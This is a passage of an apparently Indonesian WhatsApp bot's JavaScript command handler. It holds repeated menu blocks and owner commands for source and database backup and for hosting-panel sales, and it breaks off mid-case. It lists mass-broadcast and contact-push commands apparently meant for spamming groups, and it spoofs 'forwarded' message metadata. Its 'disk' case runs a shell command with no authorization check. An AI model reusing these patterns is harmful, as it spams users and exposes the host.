await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ SEARCH MENU ]*
${tengah}
${garis} ${prefix}google
${garis} ${prefix}yts
${garis} ${prefix}play
${garis} ${prefix}ttsearch
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "groupmenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ GROUP MENU ]*
${tengah}
${garis} ${prefix}add 
${garis} ${prefix}welcome
${garis} ${prefix}setname
${garis} ${prefix}linkgc
${garis} ${prefix}tagall
${garis} ${prefix}hidetag
${garis} ${prefix}promote
${garis} ${prefix}demote
${garis} ${prefix}kick 
${garis} ${prefix}closetime
${garis} ${prefix}opentime
${garis} ${prefix}antilink
${garis} ${prefix}editdesk
${garis} ${prefix}sendlinkgc
${garis} ${prefix}resetlinkgc
${garis} ${prefix}totag
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "aimenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ AI MENU ]*
${tengah}
${garis} ${prefix}RezzHost
${garis} ${prefix}RezzHostchat
${garis} ${prefix}bard
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "panelmenu": {
if (!isRegistered) return m.reply(mess.regis) 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ PANEL MENU ]*
${tengah}
${garis} ${prefix}addusr
${garis} ${prefix}addsrv
${garis} ${prefix}ramlist
${garis} ${prefix}delsrv
${garis} ${prefix}delusr
${garis} ${prefix}listpanel
${garis} ${prefix}addpanel
${garis} ${prefix}listadmin
${garis} ${prefix}addadmin
${garis} ${prefix}listsrv
${garis} ${prefix}listusr
${garis} ${prefix}delpanel
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "storemenu": {
if (!isRegistered) return m.reply(mess.regis) 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ STORE MENU ]*
${tengah}
${garis} .done
${garis} .batal
${garis} .tunda
${garis} .reqpanel
${garis} .payment
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
break
case "domainmenu": {
if (!isRegistered) return m.reply(mess.regis) 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ DOMAIN MENU ]*
${tengah}
${garis} ${prefix}addgc
${garis} ${prefix}delgc
${garis} ${prefix}subdomain 
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "gamemenu": {
if (!isRegistered) return m.reply(mess.regis) 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ GAME MENU ]*
${tengah}
${garis} .tebakbomb
${garis} .casino
${garis} .slot
${garis} .tictactoe
${garis} .delttt
${garis} .suit
${garis} .cekkhodam
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "pushmenu": {
if (!isRegistered) return m.reply(mess.regis) 
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ PUSH MENU ]*
${tengah}
${garis} .bcgc
${garis} .jpmtesti
${garis} .jpm
${garis} .pushkontak
${garis} .pushkontak1
${garis} .listgc
${garis} .startjpm
${garis} .setteksjpm
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
// batas menu


//OWNER MENU
case "backupsc":{
if (!isCreator) return m.reply(mess.owner)
m.reply(mess.wait)
  const { execSync } = require("child_process");
  const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
  (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != ".npm" &&
pe != ""
);
  const exec = await execSync(`zip -r New.zip ${ls.join(" ")}`);
  await RezzHost.sendMessage(m?.chat,
{
  document: await fs.readFileSync("./New.zip"),
  mimetype: "application/zip",
  fileName: `InzieOfcz.zip`,
},
{ quoted: kalgans }
  );
  await execSync("rm -rf New.zip");
}
break

case 'addgc':
if (!m.isGroup) return m.reply(`Khusus Grup`)
if (!isCreator) return m.reply(`khusus Creator`)
ntilink.push(m.chat)
fs.writeFileSync('./database/idgroup.json', JSON.stringify(ntilink))
m.reply(`${command} sukses`)
break

case 'delgc':
if (!isCreator) return m.reply(`khusus Creator`)
if (!m.isGroup) return m.reply(`Khusus Grup`)
var ini = ntilink.indexOf(m.chat)
ntilink.splice(ini, 1)
fs.writeFileSync('./database/idgruop.json', JSON.stringify(ntilink))
m.reply(`${command} sukses`)
break

case 'hidetag': {
if (!isCreator) return m.reply(mess.owner)
if (!m.isGroup) return m.reply(mess.group)
RezzHost.sendMessage(from, { text : q ? q : '' , mentions: participants.map(a => a.id)}, {quoted:kalgans})
}
break

case "disk":{
exec('cd && du -h --max-depth=1', (err, stdout) => {
if (err) return m?.reply(`${err}`)
if (stdout) return m?.reply(stdout)
})
}
break

case "backupdb": case "backupdatabase": {
if (!isCreator) return m.reply(mess.owner)
 RezzHost.sendMessage(m.chat, {document: await fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'application/json'}, {quoted: kalgans})
}
break

case 'sdomain': case 'sendomain': {
if (!isCreator) return m.reply(`Ngapain ? Khusus RezzHostXdzz Aja !!`)
if (!text) return m.reply(`Example : ${prefix + command} 6285xxxxx,harga,domain`)
m.reply('Pesanan Telah Sukses Dikirim') 
var mon = args.join(' ')
var m1 = mon.split(",")[0]
var m2 = mon.split(",")[1]
var m3 = mon.split(",")[2]
let mq1 = m1 + '@s.whatsapp.net'
let ownernya = owner + '@s.whatsapp.net'
let me = m.sender
let ments = [mq1, ownernya, me]
RezzHost.sendMessage(mq1, {text:`
*───❖》RezzHost 《❖───*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*📦 Pesananmu Datang 📦*
*Harga : ${m2}*
*Hari : ${hariini}*
*Tanggal : ${tanggal}*
*Jam : ${jam}*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*[+] Domain : ${m3}*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*_Note : Tutup ( Sensor ) Domain Anda*
*Dan Jangan Sampai Orang Lain Melihat*
*Atau Tidak Nanti Domain Anda Bakal Kena Ddos Attack_*
 
 *© RezzHost*`}, m) 
}
break

case 'spanel': case 'sendpanel': {
if (!isCreator) return m.reply(`NGAPAIN ANJG`)
